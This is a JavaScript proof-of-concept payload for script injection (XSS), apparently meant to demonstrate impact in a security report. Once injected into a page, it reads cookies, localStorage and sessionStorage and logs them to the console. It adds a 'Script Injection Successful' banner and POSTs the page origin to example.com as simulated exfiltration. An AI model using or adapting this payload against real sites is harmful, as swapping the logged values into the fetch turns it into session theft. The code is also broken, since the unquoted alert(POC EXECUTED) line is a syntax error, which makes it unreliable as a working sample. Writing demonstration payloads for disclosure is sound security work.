(function () {
  console.log("[POC] Injected script executed on:", location.origin);
  alert(POC EXECUTED);
  // 1. Show cookie access (truncate for safety)
  const cookies = document.cookie ? document.cookie.slice(0, 100) : "No cookies";

  console.log("[POC] Cookie access:", cookies);

  console.log("[POC] localStorage:", localStorage);
  console.log("[POC] sessionStorage:", sessionStorage);  
  
  // 2. DOM modification proof
  const banner = document.createElement("div");
  banner.innerText = "[POC] Script Injection Successful";
  banner.style.position = "fixed";
  banner.style.bottom = "10px";
  banner.style.right = "10px";
  banner.style.background = "#c00";
  banner.style.color = "#fff";  
  banner.style.padding = "10px";
  banner.style.fontSize = "14px";
  banner.style.zIndex = "9999";
  banner.style.borderRadius = "5px";
  banner.style.boxShadow = "0 0 5px rgba(0,0,0,0.3)";
  document.body.appendChild(banner);

  // 3. Simulated exfiltration (SAFE — no real data sent)
  fetch("https://example.com/poc-log", {
    method: "POST",
    body: JSON.stringify({
      origin: location.origin,
      note: "POC only - no sensitive data exfiltrated"
    }),
    headers: {
      "Content-Type": "application/json"
    }
  }).catch(() => {});

})();
